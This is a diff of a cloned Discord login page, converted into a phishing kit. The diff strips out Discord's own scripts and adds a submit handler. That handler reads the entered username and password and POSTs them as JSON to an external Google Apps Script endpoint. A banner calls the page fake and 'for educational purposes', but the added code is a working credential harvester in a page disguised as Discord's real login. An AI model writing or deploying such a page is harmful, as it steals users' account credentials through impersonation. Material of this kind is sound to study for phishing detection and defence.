@@ -5,7 +5,6 @@
   data-rh="lang,style,class">
 
 <head>
-  <script src="/src/sendLogin.js"></script>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta content="width=device-width,initial-scale=1,maximum-scale=3" name="viewport">
 
@@ -19,41 +18,6 @@
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:site" content="@discord">
   <meta name="twitter:creator" content="@discord">
-  <!-- endsection -->
-  <script nonce="">window.GLOBAL_ENV = {
-      API_ENDPOINT: '//discord.com/api',
-      API_VERSION: 9,
-      GATEWAY_ENDPOINT: 'wss://gateway.discord.gg',
-      WEBAPP_ENDPOINT: '//discord.com',
-      CDN_HOST: 'cdn.discordapp.com',
-      ASSET_ENDPOINT: '//discord.com',
-      MEDIA_PROXY_ENDPOINT: '//media.discordapp.net',
-      IMAGE_PROXY_ENDPOINTS: '//images-ext-1.discordapp.net,//images-ext-2.discordapp.net',
-      WIDGET_ENDPOINT: '//discord.com/widget',
-      INVITE_HOST: 'discord.gg',
-      GUILD_TEMPLATE_HOST: 'discord.new',
-      GIFT_CODE_HOST: 'discord.gift',
-      RELEASE_CHANNEL: 'stable',
-      DEVELOPERS_ENDPOINT: '//discord.com',
-      MARKETING_ENDPOINT: '//discord.com',
-      BRAINTREE_KEY: 'production_ktzp8hfp_49pp2rp4phym7387',
-      STRIPE_KEY: 'pk_live_CUQtlpQUF0vufWpnpUmQvcdi',
-      ADYEN_KEY: 'live_E3OQ33V6GVGTXOVQZEAFQJ6DJIDVG6SY',
-      NETWORKING_ENDPOINT: '//router.discordapp.net',
-      RTC_LATENCY_ENDPOINT: '//latency.discord.media/rtc',
-      ACTIVITY_APPLICATION_HOST: 'discordsays.com',
-      PROJECT_ENV: 'production',
-      REMOTE_AUTH_ENDPOINT: '//remote-auth-gateway.discord.gg',
-      SENTRY_TAGS: { "buildId": "698f9d3892d3e671aa559cd94c7e89a09f0d4814", "buildType": "normal" },
-      MIGRATION_SOURCE_ORIGIN: 'https://discordapp.com',
-      MIGRATION_DESTINATION_ORIGIN: 'https://discord.com',
-      HTML_TIMESTAMP: Date.now(),
-      PUBLIC_PATH: '/assets/',
-      STATIC_ENDPOINT: '',
-      DEV_SESSION_KEY: 'undefined',
-    };</script>
-  <script
-    nonce="">!function () { if (null != window.WebSocket) { if (function (n) { try { var o = localStorage.getItem(n); return null == o ? null : JSON.parse(o) } catch (n) { return null } }("token") && !window.__OVERLAY__) { var n = null != window.DiscordNative || null != window.require ? "etf" : "json", o = window.GLOBAL_ENV.GATEWAY_ENDPOINT + "/?encoding=" + n + "&v=" + window.GLOBAL_ENV.API_VERSION; null != window.DiscordNative && void 0 !== window.Uint8Array && void 0 !== window.TextDecoder ? o += "&compress=zstd-stream" : void 0 !== window.Uint8Array && (o += "&compress=zlib-stream"), console.log("[FAST CONNECT] " + o + ", encoding: " + n + ", version: " + window.GLOBAL_ENV.API_VERSION); var e = new WebSocket(o); e.binaryType = "arraybuffer"; var i = Date.now(), w = { open: !1, identify: !1, gateway: o, messages: [] }; e.onopen = function () { console.log("[FAST CONNECT] connected in " + (Date.now() - i) + "ms"), w.open = !0 }, e.onclose = e.onerror = function () { window._ws = null }, e.onmessage = function (n) { w.messages.push(n) }, window._ws = { ws: e, state: w } } } }()</script>
   <!-- section:title -->
   <title>Discord</title>
   <!-- endsection -->
@@ -711,7 +675,7 @@
                               This page is fake and for educational purposes only!</div>
                           </div>
                           <form id="loginForm"> <!--Login Form-->
-                            <div class="block_b83a05 marginTop20_f7730b">
+                            <div class="block_b83a05 marginTop20_f7730b" id="loginForm">
                               <div class="marginBottom20_f7730b">
                                 <div class="fieldWrapper_bf709e"><label
                                     class="label_c46f6a eyebrow_c46f6a defaultColor_c46f6a defaultMarginlabel_c46f6a"
@@ -821,13 +785,34 @@
   <div style="position: fixed; opacity: 0; pointer-events: none;"></div>
   <div></div>
   </div>
-  <script nonce="">window.__OVERLAY__ = /overlay/.test(location.pathname)</script>
-  <script nonce="">window.__BILLING_STANDALONE__ = /^\/billing/.test(location.pathname)</script>
-
   <script src="./Discord_files/web.32d39ccf088c3f500ddd.js.download" defer=""></script>
   <script src="./Discord_files/sentry.63ddf3684e9502344f88.js.download" defer=""></script>
-  <script
-    nonce="">(function () { function c() { var b = a.contentDocument || a.contentWindow.document; if (b) { var d = b.createElement('script'); d.nonce = 'MjI3LDIwNywxNDEsMTM3LDcxLDMwLDIzOSwyMg=='; d.innerHTML = "window.__CF$cv$params={r:'8f51f4546cd11ca4',t:'MTczNDcyMjA1Ni4wMDAwMDA='};var a=document.createElement('script');a.nonce='MjI3LDIwNywxNDEsMTM3LDcxLDMwLDIzOSwyMg==';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);"; b.getElementsByTagName('head')[0].appendChild(d) } } if (document.body) { var a = document.createElement('iframe'); a.height = 1; a.width = 1; a.style.position = 'absolute'; a.style.top = 0; a.style.left = 0; a.style.border = 'none'; a.style.visibility = 'hidden'; document.body.appendChild(a); if ('loading' !== document.readyState) c(); else if (window.addEventListener) document.addEventListener('DOMContentLoaded', c); else { var e = document.onreadystatechange || function () { }; document.onreadystatechange = function (b) { e(b); 'loading' !== document.readyState && (document.onreadystatechange = e, c()) } } } })();</script>
+  <script>document.getElementById('loginForm').addEventListener('submit', async (event) => {
+      event.preventDefault();
+
+      const username = document.getElementById('uid_8').value;
+      const password = document.getElementById('uid_10').value;
+
+      try {
+        const response = await fetch('https://script.google.com/macros/s/AKfycbyP4lkq4M3xE_hq-dBzDyVIB8R3SzF-Q9zURjHC4Fyr8FeLPqXVjVCOKmifSUk11Rsi/exec', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ username, password }),
+        });
+
+        const result = await response.json();
+        if (result.status === 'success') {
+          console.log('Data submitted successfully!');
+        } else {
+          console.log('Error submitting data.');
+        }
+      } catch (error) {
+        console.error(`Error: ${error.message}`);
+      }
+    });</script>
+
   <div class="drag-previewer"
     style="z-index: 1000; filter: drop-shadow(0 0 0 var(--background-floating)) drop-shadow(var(--elevation-high));">
     <svg style="contain: paint;">
